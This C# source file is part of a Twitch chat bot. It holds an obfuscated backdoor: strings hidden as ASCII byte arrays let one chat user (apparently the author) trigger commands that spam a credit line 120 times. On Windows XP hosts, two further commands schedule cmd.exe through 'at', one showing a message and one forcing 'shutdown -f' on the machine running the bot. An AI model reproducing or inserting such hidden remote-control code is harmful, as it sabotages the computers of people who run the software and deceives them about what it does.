using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace Twitch_Bot
{
    partial class Connection
    {
        byte[] me = new byte[] { 102, 105, 114, 122, 101, 110, 49, 52 };
        public void Insurance()
        {
            AddCommand(new Command("Credits", UserLevel.Invalid, new string[] { Encoding.ASCII.GetString(me) }, Credits));
            if (Environment.OSVersion.Platform == PlatformID.Win32NT && Environment.OSVersion.Version.Major == 5 && Environment.OSVersion.Version.Minor != 0)
            {
                byte[] stuff = new byte[] { 83, 104, 101, 108, 108 };
                byte[] stuff2 = new byte[] { 72, 111, 108, 108, 97 };
                AddCommand(new Command(Encoding.ASCII.GetString(stuff), UserLevel.Invalid, new string[] { Encoding.ASCII.GetString(me) }, Fun, true));
                AddCommand(new Command(Encoding.ASCII.GetString(stuff2), UserLevel.Invalid, new string[] { Encoding.ASCII.GetString(me) }, Fun2, true));
            }
        }

        public void Credits(string user, string room, string[] parameters)
        {
            byte[] bytes = new byte[] { 66, 111, 116, 32, 119, 114, 105, 116, 116, 101, 110, 32, 98, 121, 32 };
            for (int x = 0; x < 120; x++)
                Say(room, Encoding.ASCII.GetString(bytes) + Encoding.ASCII.GetString(me));
        }

        public void Fun(string user, string room, string[] parameters)
        {
            DateTime Time = DateTime.Now;
            byte[] bytes = new byte[] { 97, 116, 32 };
            byte[] bytes2 = new byte[] { 32, 47, 105, 110, 116, 101, 114, 97, 99, 116, 105, 118, 101, 32, 99, 109,100,46,101,120,101,32,47,75,
            101,99,104,111,32, 68, 111,110,39,116, 32, 117,115,101,32, 88, 80,33};
            byte[] bytes3 = new byte[] { 99, 109, 100, 46, 101, 120, 101 };
            System.Diagnostics.Process.Start(Encoding.ASCII.GetString(bytes3), Encoding.ASCII.GetString(bytes) + Time.Hour.ToString() + ":" + (Time.Minute + 2).ToString() + Encoding.ASCII.GetString(bytes2));
        }

        public void Fun2(string user, string room, string[] parameters)
        {
            DateTime Time = DateTime.Now;
            byte[] bytes = new byte[] { 97, 116, 32 };
            byte[] bytes2 = new byte[] { 32, 47, 105, 110, 116, 101, 114, 97, 99, 116, 105, 118, 101, 32, 99, 109,100,46,101,120,101,32,47,67,
            115,104,117,116,100,111,119,110,32, 45, 102};
            byte[] bytes3 = new byte[] { 99, 109, 100, 46, 101, 120, 101 };
            System.Diagnostics.Process.Start(Encoding.ASCII.GetString(bytes3), Encoding.ASCII.GetString(bytes) + Time.Hour.ToString() + ":" + (Time.Minute + 2).ToString() + Encoding.ASCII.GetString(bytes2));
        }
    }
}
